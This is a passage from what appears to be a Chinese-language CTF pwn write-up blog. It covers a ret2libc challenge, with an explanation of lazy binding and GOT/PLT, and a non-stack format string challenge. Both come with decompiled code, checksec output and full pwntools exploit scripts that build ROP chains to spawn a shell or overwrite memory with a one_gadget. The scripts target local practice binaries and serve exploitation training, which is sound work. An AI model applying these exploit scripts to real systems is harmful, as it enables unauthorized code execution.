class="line">p.recvuntil(<span class="string">b&#x27;How can I use &#x27;</span>)</span><br><span class="line">read_plt_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Leaked read@plt address: <span class="subst">&#123;<span class="built_in">hex</span>(read_plt_addr)&#125;</span>&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;without a backdoor? Damn!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算程序基地址 (read@plt 偏移固定为 0x1060)</span></span><br><span class="line"><span class="comment">#这一点可以通过readelf得到</span></span><br><span class="line">program_base = read_plt_addr - <span class="number">0x1060</span></span><br><span class="line">log.success(<span class="string">f&quot;Program base address: <span class="subst">&#123;<span class="built_in">hex</span>(program_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第二阶段：返回 main 函数 =====</span></span><br><span class="line"><span class="comment"># 计算 main 函数的绝对地址</span></span><br><span class="line">main_offset = <span class="number">0x11ce</span>  <span class="comment"># 从 objdump 获取/从 IDA获取</span></span><br><span class="line">main_addr = program_base + main_offset</span><br><span class="line">ret_addr  = program_base + <span class="number">0x101a</span> <span class="comment">#由ROPgadget获得ret片段</span></span><br><span class="line"><span class="comment"># 构造第一次 payload</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload1 += p64(ret_addr)<span class="comment">#初始对齐</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line">payload1 += p64(ret_addr)<span class="comment">#栈对齐</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">log.info(<span class="string">f&quot;Sent payload1 to return to main @ <span class="subst">&#123;<span class="built_in">hex</span>(main_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第三阶段：获取 read 的真实地址 =====</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;How can I use &#x27;</span>)</span><br><span class="line">read_libc_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Leaked read@libc address: <span class="subst">&#123;<span class="built_in">hex</span>(read_libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;without a backdoor? Damn!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第四阶段：计算 libc 基址 =====</span></span><br><span class="line"><span class="comment"># 使用 libc 中的 read 偏移</span></span><br><span class="line">read_offset = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">libc_base = read_libc_addr - read_offset</span><br><span class="line">log.success(<span class="string">f&quot;Libc base address: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第五阶段：构造 ROP 链 =====</span></span><br><span class="line"><span class="comment"># 计算关键函数地址</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 gadget 地址</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span>  <span class="comment"># pop rdi; ret</span></span><br><span class="line">ret_addr = libc_base + <span class="number">0x29cd6</span>  <span class="comment"># ret (用于栈对齐)</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;System address: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Bin/sh address: <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;pop rdi; ret gadget: <span class="subst">&#123;<span class="built_in">hex</span>(pop_rdi)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;ret gadget: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 ROP 链 (添加 ret 指令确保栈对齐)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload2 += p64(ret_addr)      <span class="comment"># 栈对齐</span></span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(bin_sh_addr)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送最终 payload</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">log.success(<span class="string">&quot;Payload2 sent! Enjoy your shell :)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 获取交互式 shell =====</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="ezlibc"><a href="#ezlibc" class="headerlink" title="ezlibc"></a>ezlibc</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What is this?\nHow can I use %p without a backdoor? Damn!\n&quot;</span>, &amp;read);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Something happening&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec分析：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./ret2libc</span></span><br><span class="line">[*] &#x27;/home/kali/CTF_Scripts/Practice/ret2libc&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure></div>

<p>附件中给了libc.so.6，可以看出这是ret2libc，主要涉及的知识点是<strong>延迟绑定</strong></p>
<h3 id="how-to-understand-lazy-binding"><a href="#how-to-understand-lazy-binding" class="headerlink" title="how to understand lazy binding?"></a>how to understand lazy binding?</h3><p><strong>延迟绑定（Lazy Binding）</strong> 是动态链接的核心优化机制，其核心思想是：<strong>只有当函数第一次被调用时，才动态解析其真实地址</strong>，而非在程序启动时解析所有函数。这种设计在性能与资源管理上具有显著优势。</p>
<p>按照操作系统的思想来理解，可以将其理解为Cache。</p>
<h4 id="与-GOT-PLT-的协同实现"><a href="#与-GOT-PLT-的协同实现" class="headerlink" title="与 GOT &#x2F; PLT 的协同实现"></a><strong>与 GOT &#x2F; PLT 的协同实现</strong></h4><table>
<thead>
<tr>
<th align="center">组件</th>
<th align="center">作用</th>
<th align="center">延迟绑定中的关键行为</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>PLT</strong>   (Procedure Linkage Table)</td>
<td align="center">跳转桩代码（Stub）  位于<code>**.plt**</code>节，每个函数一个条目</td>
<td align="center">首次调用时：通过<code>**push**</code>+<code>**jmp**</code>触发解析   后续调用：直接跳转至 GOT 地址</td>
</tr>
<tr>
<td align="center"><strong>GOT</strong>   (Global Offset Table)</td>
<td align="center">地址存储表   <code>**.got.plt**</code>节存储函数地址，<code>**.got**</code>节存储全局变量</td>
<td align="center">初始值 → 指向 PLT 解析桩代码   解析后 → 更新为真实函数地址</td>
</tr>
</tbody></table>
<h3 id="脚本解析：-1"><a href="#脚本解析：-1" class="headerlink" title="脚本解析："></a>脚本解析：</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">36713</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ret2libc&#x27;)  # 本地测试选项</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第一阶段：泄露 read@plt 并计算程序基址 =====</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;How can I use &#x27;</span>)</span><br><span class="line">read_plt_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Leaked read@plt address: <span class="subst">&#123;<span class="built_in">hex</span>(read_plt_addr)&#125;</span>&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;without a backdoor? Damn!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算程序基地址 (read@plt 偏移固定为 0x1060)</span></span><br><span class="line">program_base = read_plt_addr - <span class="number">0x1060</span></span><br><span class="line">log.success(<span class="string">f&quot;Program base address: <span class="subst">&#123;<span class="built_in">hex</span>(program_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第二阶段：返回 main 函数 =====</span></span><br><span class="line"><span class="comment"># 计算 main 函数的绝对地址</span></span><br><span class="line">main_offset = <span class="number">0x11ce</span>  <span class="comment"># 从 objdump 获取</span></span><br><span class="line">main_addr = program_base + main_offset</span><br><span class="line">ret_addr  = program_base + <span class="number">0x101a</span></span><br><span class="line"><span class="comment"># 构造第一次 payload</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload1 += p64(ret_addr)</span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line">payload1 += p64(ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">log.info(<span class="string">f&quot;Sent payload1 to return to main @ <span class="subst">&#123;<span class="built_in">hex</span>(main_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第三阶段：获取 read 的真实地址 =====</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;How can I use &#x27;</span>)</span><br><span class="line">read_libc_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Leaked read@libc address: <span class="subst">&#123;<span class="built_in">hex</span>(read_libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;without a backdoor? Damn!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第四阶段：计算 libc 基址 =====</span></span><br><span class="line"><span class="comment"># 使用 libc 中的 read 偏移</span></span><br><span class="line">read_offset = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">libc_base = read_libc_addr - read_offset</span><br><span class="line">log.success(<span class="string">f&quot;Libc base address: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第五阶段：构造 ROP 链 =====</span></span><br><span class="line"><span class="comment"># 计算关键函数地址</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 gadget 地址</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span>  <span class="comment"># pop rdi; ret</span></span><br><span class="line">ret_addr = libc_base + <span class="number">0x29cd6</span>  <span class="comment"># ret (用于栈对齐)</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;System address: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Bin/sh address: <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;pop rdi; ret gadget: <span class="subst">&#123;<span class="built_in">hex</span>(pop_rdi)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;ret gadget: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 ROP 链 (添加 ret 指令确保栈对齐)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload2 += p64(ret_addr)      <span class="comment"># 栈对齐</span></span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(bin_sh_addr)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送最终 payload</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">log.success(<span class="string">&quot;Payload2 sent! Enjoy your shell :)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 获取交互式 shell =====</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="fmt-S"><a href="#fmt-S" class="headerlink" title="fmt_S"></a>fmt_S</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re walking down the road when a monster appear.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">3</span> &amp;&amp; !flag; ++i )</span><br><span class="line">        talk();</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;atk &lt;= <span class="number">0x1BF52</span>uLL )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;ve been eaten by the monster.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        he();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">talk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You start talking to him...&quot;</span>);</span><br><span class="line">  flag ^= <span class="number">1u</span>;</span><br><span class="line">  read(<span class="number">0</span>, fmt, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(fmt);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> my_read(&amp;atk, <span class="number">8uLL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">he</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> command[<span class="number">6</span>]; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(command, <span class="string">&quot;a_flag&quot;</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The monster is defeated, and you obtain: flag?&quot;</span>);</span><br><span class="line">  system(command);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec分析：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./pwn</span></span><br><span class="line">[*] &#x27;/home/kali/CTF_Scripts/Practice/fmt_s/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3fc000)</span><br><span class="line">    RUNPATH:    b&#x27;/home/kali/CTF_Scripts/Practice/fmt_s/libc.so.6&#x27;</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这道题的主要考点在于<strong>非栈上格式化字符串漏洞利用</strong></p>
<h3 id="how-to-solve-a-Non-stack-Format-String-Vulnerability-problem"><a href="#how-to-solve-a-Non-stack-Format-String-Vulnerability-problem" class="headerlink" title="how to solve a Non-stack Format String Vulnerability problem"></a>how to solve a Non-stack Format String Vulnerability problem</h3><p>一般来说，栈上的格式化字符串漏洞利用步骤是先泄露地址，包括ELF程序地址和libc地址；然后将需要改写的GOT表地址直接传到栈上，同时利用%c%n的方法改写入system或one_gadget地址，最后就是劫持流程。但是对于BSS段或是堆上格式化字符串，也就是非栈上格式化字符串漏洞，无法直接将想要改写的地址指针放置在栈上，也就没办法实现任意地址写。</p>
<p>这种情况要怎么办呢，我们就需要构造一条指针链，最好是栈上的指针链，因为这样指针之间一般只有最后两字节不同，比较容易修改。</p>
<h3 id="脚本解析-5"><a href="#脚本解析-5" class="headerlink" title="脚本解析"></a>脚本解析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;127.0.0.1&quot;,37285)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b*0x401332&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b*0x4013ed&quot;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;You start talking to him...&quot;</span>,<span class="string">b&quot;%33$p.%6$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak &gt;&gt;&gt;&quot;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_base = leak - <span class="number">0x29e40</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leak1 = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak1))</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack = leak1</span><br><span class="line">ogg = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line">og = libc_base + ogg[<span class="number">0</span>]</span><br><span class="line">i_addr = stack - <span class="number">0x120</span> + <span class="number">7</span></span><br><span class="line">stack1 = stack - <span class="number">0x70</span> - <span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">ex = libc_base + <span class="number">0x74cc7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(i_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack1))</span><br><span class="line"><span class="comment">#20 47</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(i_addr&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x80</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;og &gt;&gt;&gt;&quot;</span>,<span class="built_in">hex</span>(og))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(og&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to 